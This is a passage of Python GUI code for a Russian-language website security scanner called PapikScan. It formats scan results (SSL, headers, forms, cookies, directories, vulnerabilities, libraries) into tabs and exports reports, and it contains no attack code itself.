                content += f"   • Владелец: {cert.get('subject', {}).get('commonName', 'Неизвестно')}\n"
                content += f"   • Истекает: {cert.get('expires', 'Неизвестно')}\n\n"

            if 'vulnerabilities' in ssl_data and ssl_data['vulnerabilities']:
                content += "⚠️ ПРОБЛЕМЫ:\n"
                for vuln in ssl_data['vulnerabilities']:
                    content += f"   • {vuln['type']}: {vuln['description']}\n"
            else:
                content += "✅ SSL уязвимости не обнаружены!\n\n"

            content += f"🔐 Шифр: {ssl_data.get('cipher_suite', {}).get('name', 'Неизвестно')} ({ssl_data.get('cipher_suite', {}).get('bits', 0)} бит)"

        self.tab_contents['ssl'].delete("0.0", "end")
        self.tab_contents['ssl'].insert("0.0", content)

    def populate_headers_tab(self, headers_data):
        content = "📋 ЗАГОЛОВКИ БЕЗОПАСНОСТИ\n" + "=" * 50 + "\n\n"

        for header, info in headers_data.items():
            status = info.get('status', '')
            if status == 'OK':
                status_icon = "✅"
            elif status in ['MISSING', 'VULNERABLE']:
                status_icon = "❌"
            else:
                status_icon = "ℹ️"

            content += f"{status_icon} {header}\n"

            if info.get('status') == 'OK':
                content += f"   Значение: {info.get('value', '')[:80]}...\n"
            else:
                content += f"   Проблема: {info.get('description', 'Не настроен')}\n"
                content += f"   Рекомендация: {info.get('recommendation', 'Нет')}\n"
            content += "\n"

        self.tab_contents['headers'].delete("0.0", "end")
        self.tab_contents['headers'].insert("0.0", content)

    def populate_forms_tab(self, forms_data):
        content = "📝 АНАЛИЗ ФОРМ\n" + "=" * 50 + "\n\n"

        if not forms_data:
            content += "ℹ️ Формы не обнаружены"
        else:
            for form in forms_data:
                content += f"📋 Форма #{form.get('form_id')}\n"
                content += f"   • Метод: {form.get('method')}\n"
                content += f"   • Action: {form.get('action') or 'Текущая страница'}\n"

                vulns = form.get('vulnerabilities', [])
                if vulns:
                    content += f"   ⚠️ Проблемы ({len(vulns)}):\n"
                    for vuln in vulns:
                        content += f"      • {vuln['type']}: {vuln['description']}\n"
                        if 'recommendation' in vuln:
                            content += f"        Рекомендация: {vuln['recommendation']}\n"
                else:
                    content += "   ✅ Проблемы не обнаружены\n"
                content += "\n"

        self.tab_contents['forms'].delete("0.0", "end")
        self.tab_contents['forms'].insert("0.0", content)

    def populate_cookies_tab(self, cookies_data):
        content = "🍪 АНАЛИЗ COOKIES\n" + "=" * 50 + "\n\n"

        if not cookies_data:
            content += "ℹ️ Cookies не обнаружены"
        else:
            for cookie in cookies_data:
                content += f"🍪 {cookie.get('name')}\n"
                content += f"   • Домен: {cookie.get('domain')}\n"

                issues = cookie.get('issues', [])
                if issues:
                    content += f"   ⚠️ Проблемы:\n"
                    for issue in issues:
                        content += f"      • {issue['type']}: {issue['description']}\n"
                else:
                    content += "   ✅ Проблемы не обнаружены\n"
                content += "\n"

        self.tab_contents['cookies'].delete("0.0", "end")
        self.tab_contents['cookies'].insert("0.0", content)

    def populate_directories_tab(self, dirs_data):
        content = "📁 ПОИСК ДИРЕКТОРИЙ\n" + "=" * 50 + "\n\n"

        if not dirs_data:
            content += "ℹ️ Доступные директории не обнаружены"
        else:
            content += f"Найдено путей: {len(dirs_data)}\n\n"

            for directory in dirs_data:
                risk_level = directory.get('risk_level', 'MEDIUM')
                risk_icon = {"HIGH": "🔴", "MEDIUM": "🟠", "LOW": "🟢"}.get(risk_level, "⚪")
                content += f"{risk_icon} /{directory['path']}\n"
                content += f"   • HTTP код: {directory['status_code']}\n"
                content += f"   • Риск: {risk_level}\n\n"

        self.tab_contents['directories'].delete("0.0", "end")
        self.tab_contents['directories'].insert("0.0", content)

    def populate_javascript_tab(self, js_data):
        content = "⚡ АНАЛИЗ JAVASCRIPT\n" + "=" * 50 + "\n\n"

        if not js_data:
            content += "✅ JavaScript проблемы не обнаружены"
        else:
            content += f"Найдено проблем: {len(js_data)}\n\n"

            for issue in js_data:
                severity = issue.get('severity', 'MEDIUM')
                severity_icon = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}.get(severity, "⚪")
                content += f"{severity_icon} {issue['type']}\n"
                content += f"   {issue['description']}\n"
                if 'recommendation' in issue:
                    content += f"   Рекомендация: {issue['recommendation']}\n"
                content += "\n"

        self.tab_contents['javascript'].delete("0.0", "end")
        self.tab_contents['javascript'].insert("0.0", content)

    def populate_vulnerabilities_tab(self, web_vulns, server_vulns, api_vulns):
        content = "⚠️ ОБНАРУЖЕННЫЕ УЯЗВИМОСТИ\n" + "=" * 60 + "\n\n"

        # Группировка по категориям
        categories = {
            "Веб-уязвимости": web_vulns,
            "Серверные уязвимости": server_vulns,
            "API/Протоколы": api_vulns
        }

        for category, vulns in categories.items():
            content += f"\n🔍 {category} ({len(vulns)}):\n"
            if not vulns:
                content += "  ✅ Проблемы не обнаружены\n"
                continue

            for vuln in vulns:
                severity = vuln.get('severity', 'MEDIUM')
                color = {'CRITICAL': '🔴', 'HIGH': '🟠', 'MEDIUM': '🟡', 'LOW': '🟢'}.get(severity, '⚪')
                content += f"\n{color} [{severity}] {vuln['type']}"
                if 'param' in vuln:
                    content += f" (параметр: {vuln['param']})"
                content += f"\n• Описание: {vuln.get('description', vuln.get('payload', 'Уязвимость обнаружена'))}"
                if 'recommendation' in vuln:
                    content += f"\n• Рекомендация: {vuln['recommendation']}"
                if 'engine' in vuln:
                    content += f"\n• Шаблонизатор: {vuln['engine']}"

        self.tab_contents['vulnerabilities'].delete("0.0", "end")
        self.tab_contents['vulnerabilities'].insert("0.0", content)

    def populate_libraries_tab(self, libs_data):
        content = "📦 УСТАРЕВШИЕ БИБЛИОТЕКИ\n" + "=" * 50 + "\n\n"

        if not libs_data:
            content += "✅ Все библиотеки актуальны"
        else:
            content += f"Найдено библиотек: {len(libs_data)}\n\n"

            for lib in libs_data:
                status = lib.get('status', 'UNKNOWN')
                status_icon = "🟢" if status == 'FIXED' else "🟡" if status == 'UNKNOWN' else "🔴"
                content += f"{status_icon} {lib['name']} v{lib['version']}\n"
                content += f"   • Статус: {status}\n"
                content += f"   • Риск: {lib.get('severity', 'MEDIUM')}\n\n"

        self.tab_contents['libraries'].delete("0.0", "end")
        self.tab_contents['libraries'].insert("0.0", content)

    def populate_raw_tab(self, results):
        content = "📊 ТЕХНИЧЕСКИЕ ДАННЫЕ\n" + "=" * 50 + "\n\n"

        content += f"URL: {results.get('url')}\n"
        content += f"Финальный URL: {results.get('final_url')}\n"
        content += f"Код ответа: {results.get('status_code')}\n"
        content += f"Время ответа: {results.get('response_time')}с\n\n"

        content += "📋 HTTP заголовки:\n"
        headers = results.get('headers', {})
        for header, value in list(headers.items())[:10]:
            content += f"{header}: {value}\n"

        if len(headers) > 10:
            content += f"... и еще {len(headers) - 10} заголовков\n"

        content += f"\n📄 Размер контента: {len(results.get('content', ''))} символов\n"

        self.tab_contents['raw'].delete("0.0", "end")
        self.tab_contents['raw'].insert("0.0", content)

    def clear_results(self):
        for text_widget in self.tab_contents.values():
            text_widget.delete("0.0", "end")

        self.score_value.configure(text="--")
        self.risk_value.configure(text="НЕ ОПРЕДЕЛЕН", text_color=self.colors['dark'])
        self.vulns_value.configure(text="0")

    def show_error(self, error_message):
        self.scan_button.configure(state="normal", text="🚀 Запустить сканирование")
        self.progress_label.configure(text="Ошибка сканирования")
        self.status_text.configure(text="Ошибка при сканировании")
        messagebox.showerror("Ошибка", f"Не удалось выполнить сканирование:\n\n{error_message}")

    def export_report(self):
        if not self.current_results:
            messagebox.showwarning("Предупреждение", "Нет результатов для экспорта. Выполните сканирование.")
            return

        filename = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text файлы", "*.txt"), ("JSON файлы", "*.json"), ("Все файлы", "*.*")],
            title="Сохранить отчет",
            initialfile=f"PapikScan_Report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        )

        if filename:
            try:
                if filename.endswith('.json'):
                    export_data = self.current_results.copy()
                    if 'content' in export_data:
                        export_data['content'] = export_data['content'][:1000] + "... (обрезано)"

                    with open(filename, 'w', encoding='utf-8') as f:
                        json.dump(export_data, f, indent=2, ensure_ascii=False, default=str)
                else:
                    with open(filename, 'w', encoding='utf-8') as f:
                        f.write("PapikScan - Отчет по безопасности\n")
                        f.write("https://lolz.live/members/9569222/\n")
                        f.write("=" * 60 + "\n\n")
                        f.write(f"URL: {self.current_results.get('url')}\n")
                        f.write(f"Дата: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n")
                        f.write(f"Рейтинг: {self.current_results.get('security_score', 0)}/100\n\n")

                        sections = [
                            ("SSL/TLS", self.current_results.get('ssl_analysis', {})),
                            ("Заголовки", self.current_results.get('security_headers', {})),
                            ("Формы", self.current_results.get('form_vulnerabilities', [])),
                            ("Cookies", self.current_results.get('cookie_analysis', [])),
                            ("Директории", self.current_results.get('directory_scan', [])),
                            ("Уязвимости", {
                                'web_vulns': self.current_results.get('web_vulns', []),
                                'server_vulns': self.current_results.get('server_vulns', []),
                                'api_vulns': self.current_results.get('api_vulns', [])
                            }),
                            ("Библиотеки", self.current_results.get('outdated_libs', []))
                        ]

                        for section_name, section_data in sections:
                            f.write(f"\n{section_name}\n")
                            f.write("-" * 40 + "\n")
                            f.write(str(section_data) + "\n\n")

                messagebox.showinfo("Успех", f"Отчет экспортирован:\n{filename}")
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось экспортировать:\n{str(e)}")

    def run(self):
        try:
            self.root.mainloop()
        except Exception as e:
            print(f"Ошибка: {e}")
            messagebox.showerror("Критическая ошибка", f"Произошла ошибка:\n{str(e)}")


if __name__ == "__main__":
    try:
        required_modules = ['customtkinter', 'requests', 'beautifulsoup4']
        missing_modules = []

        import importlib

        for module in required_modules:
            try:
                if module == 'beautifulsoup4':
                    importlib.import_module('bs4')
                else:
                    importlib.import_module(module)
            except ImportError:
                missing_modules.append(module)

        if missing_modules:
            print("❌ Отсутствуют библиотеки:")
            for module in missing_modules:
                print(f"   • {module}")
            print(f"\n📦 Установите: pip install {' '.join(missing_modules)}")
            input("\nНажмите Enter для выхода...")
        else:
            print("🚀 Запуск PapikScan - Lolz: папик")
            print("https://lolz.live/members/9569222/")
            app = PapikScanPro()
            app.run()

    except Exception as e:
        print(f"❌ Ошибка запуска: {e}")
        input("Нажмите Enter для выхода...")